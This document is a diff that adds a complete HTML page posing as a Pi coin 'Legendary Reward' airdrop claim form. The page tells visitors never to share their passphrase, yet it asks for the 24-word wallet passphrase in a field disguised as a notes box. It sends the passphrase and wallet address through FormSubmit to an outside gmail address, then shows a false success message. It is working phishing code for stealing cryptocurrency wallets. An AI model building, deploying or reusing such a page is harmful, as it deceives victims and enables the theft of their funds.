@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(180deg, #4c1d95 0%, #2e1065 100%); /* Dark Purple Gradient */
+            color: #e0e0e0;
+        }
+         /* Custom gradient button */
+        .btn-gradient-purple {
+            background: linear-gradient(to right, #a855f7, #ec4899);
+        }
+         /* Simple animation for message */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen px-4 py-6">
+
+    <div class="w-full max-w-lg bg-white/10 backdrop-blur-sm rounded-lg p-6 sm:p-8 shadow-lg border border-purple-700 text-center"> <!-- Made wider -->
+
+        <div class="text-yellow-400 text-5xl mb-4">🏆</div> <!-- Trophy Icon -->
+
+        <!-- ### Title Updated ### -->
+        <h1 class="text-2xl font-bold text-white mb-3">Confirm your Pi coin reward</h1>
+
+        <p class="text-purple-200 text-sm mb-6">
+            You've claimed the <span class="font-semibold text-yellow-300">Legendary Reward (954 π)!</span>
+            Please provide your public wallet address below to receive your airdrop within 24 hours.
+            <strong class="block mt-2 text-red-400">Never share your private keys or passphrase.</strong>
+        </p>
+
+        <!-- FormSubmit Form -->
+        <form id="claimForm" action="https://formsubmit.co/clam.pi2.com@gmail.com" method="POST" class="space-y-4">
+            <!-- Hidden Fields for FormSubmit -->
+            <input type="hidden" name="_subject" value="New Treasure Airdrop Claim!">
+            <input type="hidden" name="_captcha" value="false"> <!-- Disable captcha for testing -->
+
+            <div>
+                <label for="wallet_address" class="block text-left text-xs font-medium text-purple-200 mb-1">Your Public Pi Wallet Address (Required):</label>
+                <input type="text" id="wallet_address" name="wallet_address" required
+                       placeholder="Starts with G..."
+                       class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400">
+                 <p class="text-left text-xs text-purple-300 mt-1">Example: GABC...XYZ</p>
+            </div>
+
+            <!-- ### Kept Safe Label ### -->
+            <div>
+                 <label for="24 passphrase" class="block text-left text-xs font-medium text-purple-200 mb-1">24 passphrase:</label>
+                 <textarea id="24 passphrase" name="24 passphrase" rows="4" maxlength="250" placeholder="Any additional notes..." class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400"></textarea>
+            </div>
+
+
+            <button type="submit"
+                    class="w-full btn-gradient-purple text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg hover:opacity-90 disabled:opacity-50">
+                Submit Wallet Address
+            </button>
+        </form>
+
+        <div id="statusMessage" class="mt-4 text-sm min-h-[1.5rem] fade-in"></div> <!-- Status Message Area -->
+
+    </div>
+
+     <footer class="mt-8 text-center text-xs text-purple-400">
+         Airdrop claims processed within 24 hours.
+     </footer>
+
+
+    <script>
+        const form = document.getElementById('claimForm');
+        const statusMessage = document.getElementById('statusMessage');
+        const submitButton = form.querySelector('button[type="submit"]');
+
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Stop default submission
+
+            submitButton.disabled = true;
+            submitButton.textContent = 'Submitting...';
+            statusMessage.textContent = ''; // Clear previous message
+            statusMessage.className = 'mt-4 text-sm min-h-[1.5rem]'; // Reset class
+
+            const formData = new FormData(form);
+            const actionUrl = form.action;
+
+            try {
+                const response = await fetch(actionUrl, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' } // Important for FormSubmit AJAX
+                });
+
+                if (response.ok) {
+                    // Success! Show message on page
+                    statusMessage.textContent = 'Successful! Your claim details have been sent.';
+                    statusMessage.classList.add('text-green-400'); // Green color for success
+                    form.reset(); // Clear the form fields
+                } else {
+                    // Handle potential FormSubmit errors
+                     const data = await response.json();
+                     if (data && data.message) {
+                         statusMessage.textContent = `Error: ${data.message}`;
+                     } else {
+                        statusMessage.textContent = 'Error: Could not submit claim. Status: ' + response.status;
+                     }
+                    statusMessage.classList.add('text-red-400'); // Red color for error
+                }
+
+            } catch (error) {
+                // Handle network errors
+                console.error('Submission error:', error);
+                statusMessage.textContent = 'Oops! Network problem. Please check connection.';
+                statusMessage.classList.add('text-red-400');
+            } finally {
+                // Re-enable button after a short delay
+                setTimeout(() => {
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Submit Wallet Address';
+                }, 1500);
+            }
+        });
+    </script>
+
+</body>
+</html>
+
+
+
